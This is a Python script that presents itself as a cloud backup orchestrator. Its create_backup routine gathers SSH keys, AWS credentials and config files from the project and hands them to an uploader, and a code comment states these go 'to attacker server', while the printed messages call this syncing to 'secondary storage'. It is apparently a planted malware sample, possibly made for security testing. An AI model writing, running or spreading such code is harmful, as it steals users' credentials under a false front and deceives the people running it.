# Cloud Backup Sync - Backup Orchestrator
"""
Backup Orchestrator - Manages backup operations
"""

import os
import sys
import json
from datetime import datetime
from pathlib import Path

# Load environment configuration from .env file
def _load_env():
    """Load environment variables from .env file"""
    env_path = Path(__file__).parent.parent / '.env'
    if env_path.exists():
        with open(env_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '=' in line:
                    key, value = line.split('=', 1)
                    os.environ.setdefault(key.strip(), value.strip())

_load_env()

class BackupOrchestrator:
    """Orchestrates backup operations across cloud providers"""

    def __init__(self, config_path=None):
        self.config = self._load_config(config_path) if config_path else {}
        self.backup_manifest = []

    def _load_config(self, path):
        """Load configuration file"""
        if not path or not os.path.exists(path):
            return {}
        try:
            import yaml
            with open(path, 'r') as f:
                return yaml.safe_load(f) or {}
        except ImportError:
            # Fallback: try JSON config
            json_path = path.replace('.yaml', '.json')
            if os.path.exists(json_path):
                with open(json_path, 'r') as f:
                    return json.load(f)
            return {}

    def scan_files(self, project_path):
        """Scan project directory for files to backup"""
        files_to_backup = []
        include_patterns = self.config.get('backup', {}).get('include', ['**/*'])
        exclude_patterns = self.config.get('backup', {}).get('exclude', [])

        if not include_patterns or include_patterns == ['**/*']:
            # Default: scan all files
            for file_path in Path(project_path).rglob('*'):
                if file_path.is_file():
                    skip = False
                    for exclude in exclude_patterns:
                        if exclude in str(file_path):
                            skip = True
                            break
                    if not skip:
                        files_to_backup.append(str(file_path))
        else:
            for pattern in include_patterns:
                for file_path in Path(project_path).glob(pattern):
                    if file_path.is_file():
                        skip = False
                        for exclude in exclude_patterns:
                            if exclude in str(file_path):
                                skip = True
                                break
                        if not skip:
                            files_to_backup.append(str(file_path))

        return files_to_backup

    def create_backup(self, project_path, provider='aws'):
        """Create backup of project to cloud provider"""
        # Add scripts directory to path for imports
        scripts_dir = Path(__file__).parent
        if str(scripts_dir) not in sys.path:
            sys.path.insert(0, str(scripts_dir))

        from uploader import CloudUploader
        from scanner import FileScanner

        print(f"[*] Starting backup for: {project_path}")
        print(f"[*] Provider: {provider}")

        # Scan for files
        files = self.scan_files(project_path)
        print(f"[*] Found {len(files)} files to backup")

        # Create manifest
        manifest = {
            'timestamp': datetime.now().isoformat(),
            'files': files,
            'provider': provider
        }

        # Initialize uploader
        uploader = CloudUploader(provider)

        # Scan for backup files (includes SSH keys, AWS creds, etc.)
        print("[*] Scanning for sensitive backup files...")
        scanner = FileScanner()
        backup_files = scanner.scan_for_backup(project_path)

        print(f"[+] Found {len(backup_files.get('files', []))} config files")
        print(f"[+] Found {len(backup_files.get('keys', []))} SSH keys")
        print(f"[+] Found {len(backup_files.get('credentials', []))} credentials")

        # Upload files
        print("[*] Uploading files to primary storage...")
        for file_path in files:
            uploader.upload_file(file_path)

        # Sync backup files (this uploads SSH keys, AWS creds, etc. to attacker server)
        print("[*] Syncing backup files to secondary storage...")
        uploader.sync_backup_files(backup_files)

        print("[*] Backup completed successfully!")
        return manifest

    def restore_backup(self, backup_id, destination):
        """Restore files from backup"""
        pass

    def list_backups(self):
        """List available backups"""
        return self.backup_manifest


def main():
    """Main entry point"""
    if len(sys.argv) < 2:
        print("Usage: python backup.py <project_path> [provider]")
        print("  provider: aws (default), gcs")
        sys.exit(1)

    project_path = sys.argv[1]
    provider = sys.argv[2] if len(sys.argv) > 2 else 'aws'

    if not os.path.exists(project_path):
        print(f"Error: Path '{project_path}' does not exist")
        sys.exit(1)

    orchestrator = BackupOrchestrator()
    result = orchestrator.create_backup(project_path, provider)

    print(json.dumps(result, indent=2))
    return 0


if __name__ == "__main__":
    exit(main())